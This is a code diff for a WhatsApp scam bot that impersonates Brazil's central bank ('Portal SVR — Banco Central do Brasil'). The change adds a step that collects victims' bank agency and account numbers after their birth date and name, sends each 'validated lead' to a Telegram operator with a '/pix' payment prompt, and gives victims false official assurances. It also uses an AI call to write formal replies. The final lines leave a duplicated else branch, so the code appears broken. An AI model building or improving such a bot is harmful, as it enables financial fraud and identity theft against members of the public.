@@ -661,7 +661,7 @@ async function processIncomingMessage(msg, targetChatId) {
             }
         }
 
-        // Data aceita — avançar para etapa 2
+        // Data aceita — avançar para etapa 2 (Nome)
         currentSession.step = 2;
         currentSession.birthDate = typedDate;
         chatSessions.set(targetChatId, currentSession);
@@ -678,11 +678,11 @@ async function processIncomingMessage(msg, targetChatId) {
         if (isPJ) {
             await msg.reply(
                 `✅ *Data de abertura confirmada!*\n\n` +
-                `📍 *ETAPA 2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
+                `📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
         } else {
             await msg.reply(
                 `✅ *Data de nascimento confirmada!*\n\n` +
-                `📍 *ETAPA 2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
+                `📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
         }
 
     // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
@@ -700,51 +700,76 @@ async function processIncomingMessage(msg, targetChatId) {
                 }
             }
 
-            // ✅ Cadastro concluído — colocar na fila de espera
+            // ✅ Nome aceito — avançar para fase 1.3 (Dados Bancários)
             currentSession.step = 3;
             currentSession.name = typedName;
+            chatSessions.set(targetChatId, currentSession);
+            saveSessions();
+
+            await msg.reply(
+                `✅ *Nome confirmado!*\n\n` +
+                `📍 *FASE 1.3:* Para concluir a autenticação de identidade, informe os *Dados Bancários* (Agência e Conta) onde deseja receber os ativos. O sistema validará se o vínculo pertence ao titular.\n\n` +
+                `📌 *Exemplo:* Agência 0001 - Conta 12345-6`);
+
+        } else {
+            // Nome inválido — IA responde de forma formal
+            const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
+            const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
+            await msg.reply(aiReply || fallback);
+        }
+
+    // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
+    } else if (currentSession.step === 3) {
+        const typedBank = text.trim();
+
+        if (typedBank.length >= 5) {
+            // ✅ Cadastro concluído — colocar na fila de espera
+            currentSession.step = 4;
+            currentSession.bankData = typedBank;
             currentSession.mode = 'waiting';
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
             // Adiciona à fila de espera
-            addToQueue(targetChatId, typedName, currentSession.birthDate);
+            addToQueue(targetChatId, currentSession.name, currentSession.birthDate);
             const queuePos = getQueuePosition(targetChatId);
             const queueSize = waitingQueue.length;
-            const tipoLabel = isPJ ? 'Pessoa Jurídica (CNPJ)' : 'Pessoa Física (CPF)';
             const clientesFrente = queuePos > 1 ? queuePos - 1 : 0;
 
-            // Edita a mensagem no Telegram com cadastro completo + posição na fila
+            // Edita a mensagem no Telegram com cadastro completo
             if (currentSession.tgMsgId) {
                 await notifyTelegram(
-                    buildCadastroMessage(targetChatId, typedName, currentSession.birthDate, 'na_fila', currentSession.docType),
+                    buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'na_fila', currentSession.docType),
                     currentSession.tgMsgId
                 );
             }
 
-            // Notifica o admin sobre o novo lead validado
+            // Notifica o admin
             await notifyTelegram(
                 `💰 <b>LEAD VALIDADO — NA FILA!</b>\n` +
-                `👤 Nome: ${typedName}\n` +
+                `👤 Nome: ${currentSession.name}\n` +
                 `📅 Data: ${currentSession.birthDate}\n` +
+                `🏛️ Banco: ${typedBank}\n` +
                 `🆔 Lead: <code>${targetChatId}</code>\n` +
-                `📊 Posição na fila: <b>${queuePos}º</b> (${queueSize} no total)\n\n` +
-                `Use /pix para enviar o protocolo de liberação.`
+                `📊 Fila: <b>${queuePos}º</b>\n\n` +
+                `Use /pix para liberar o pagamento.`
             );
 
-            // Mensagem ao lead sobre a fila de espera
             const frenteMsg = clientesFrente > 0
                 ? `Há *${clientesFrente} solicitação(ões)* sendo processada(s) antes da sua.`
                 : `Sua solicitação é a próxima a ser processada.`;
 
             await msg.reply(
                 `📋 *AUTENTICAÇÃO CONCLUÍDA — Portal SVR*\n\n` +
-                `Prezado(a) *${typedName}*,\n\n` +
-                `Sua identidade foi validada com êxito pelo sistema de segurança do Portal SVR, em conformidade com as diretrizes do Banco Central do Brasil e da Resolução nº 4.862/2020.\n\n` +
+                `Prezado(a) *${currentSession.name}*,\n\n` +
+                `Sua identidade e vínculo bancário foram validados com êxito pelo sistema federal de segurança.\n\n` +
                 `⌛ *STATUS ATUAL:* Aguardando Processamento\n\n` +
                 `${frenteMsg}\n\n` +
-                `Nosso operador responsável entrará em contato em breve para concluir a liberação de seus ativos financeiros de forma segura e sigilosa.\n\n` +
-                `_Agradecemos sua paciência._\n_Portal SVR — Banco Central do Brasil_`);
+                `Nosso operador entrará em contato em breve para os procedimentos finais de liberação dos ativos.\n\n` +
+                `_Portal SVR — Banco Central do Brasil_`);
+        } else {
+            await msg.reply(`⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
+        }
 
         } else {
             // Nome inválido — IA responde de forma formal
